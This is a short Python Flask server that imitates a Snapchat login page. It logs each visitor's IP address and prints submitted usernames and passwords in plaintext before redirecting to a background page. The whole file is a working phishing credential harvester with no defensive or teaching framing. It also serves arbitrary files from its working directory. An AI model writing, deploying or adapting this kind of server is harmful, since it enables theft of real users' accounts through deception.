from flask import Flask, request, send_from_directory
import os
import re

app = Flask(__name__)

# Function to extract valid IPv4 address
def extract_ipv4(ips):
    for ip in ips:
        if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
            return ip
    return None

# Serve the login.html file at the root URL
@app.route('/')
def serve_login():
    # Extract IP address when the login page is opened
    if request.headers.getlist("X-Forwarded-For"):
        forwarded_ips = request.headers.getlist("X-Forwarded-For")[0].split(',')
        client_ip = extract_ipv4(forwarded_ips) or request.remote_addr
    else:
        client_ip = request.remote_addr
    
    # Print the client's IP address when opening the login page
    print(f"Client IP: {client_ip}")
    
    return send_from_directory(os.getcwd(), 'snapchat_login.html')

# Handle the form submission from login
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Print the username and password when the login button is clicked
    print(f"Username: {username}")
    print(f"Password: {password}")
    
    # After login, serve a background page
    return send_from_directory(os.getcwd(), 'bg.html')

# Serve other static files (CSS, images, etc.)
@app.route('/<path:path>')
def serve_file(path):
    return send_from_directory(os.getcwd(), path)

if __name__ == "__main__":
    # Start the Flask app to listen on all IPs on port 80
    app.run(host='0.0.0.0', port=80)
